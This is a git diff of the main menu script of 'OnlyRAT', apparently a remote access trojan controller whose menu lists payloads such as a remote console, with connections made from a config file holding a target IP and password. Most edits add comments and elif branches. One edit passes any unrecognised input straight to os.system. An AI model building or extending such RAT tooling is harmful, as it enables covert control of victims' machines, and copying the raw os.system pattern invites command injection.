@@ -8,7 +8,7 @@ import sys
 import getpass
 from modules import *
 
-# variables
+# banner for display
 banner = """
      ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
     :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
@@ -22,6 +22,7 @@ banner = """
                 [::] Created By : Blue Cosmo [::]
 """
 
+# help menu
 help_menu = """
         [+] Arguments:
             XXX.rat = configuration file 
@@ -30,6 +31,7 @@ help_menu = """
             onlyrat bluecosmo.rat
 """
 
+# option menu
 options_menu = """
         [+] Payloads:
             [0] - Remote Console
@@ -43,10 +45,10 @@ options_menu = """
 
 """
 
-username = getpass.getuser()
-header = f"[~] {username}@onlyrat $ "
-remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main"
-local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT"
+username = getpass.getuser() # gets username
+header = f"[~] {username}@onlyrat $ " # sets up user input interface
+remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
+local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT
 
 # read config file
 def read_config(config_file):
@@ -114,14 +116,19 @@ def update():
         input(header)
         main()
 
+# uninstalls onlyrat
 def remove():
+    # confirmation
     print("\n [!] Are you sure you want to remove OnlyRAT [y/n]\n")
 
+    # user input
     option = input(header)
 
+    # delete OnlyRAT
     if option == "y":
         os.system("rm -rf ~/.OnlyRAT")
 
+    # cancel
     if option == "n":
         main()
 
@@ -133,12 +140,14 @@ def cli(arguments):
 
     # if arguments exist
     if arguments:
+
         # display options
         print(options_menu)
 
         # user input, option
         option = input(header)
 
+        # check if configuration file exists
         try:
             configuration = read_config(sys.argv[1])
     
@@ -156,16 +165,20 @@ def cli(arguments):
             connect(ipv4, password)        
         
         # update option
-        if option == "u" or option == "update":
+        elif option == "u" or option == "update":
             update()
 
         # remove installation
-        if option == "r" or option == "remove" or option == "uninstall":
+        elif option == "r" or option == "remove" or option == "uninstall":
             remove()
 
         # quit option
-        if option == "q" or option == "quit" or option == "exit":
+        elif option == "q" or option == "quit" or option == "exit":
             exit()
+
+        # exception
+        else:
+            os.system(option)
 
     # if arguments don't exist
     else:
@@ -173,6 +186,7 @@ def cli(arguments):
 
 # main code
 def main():
+    
     # clear screen
     clear()
 
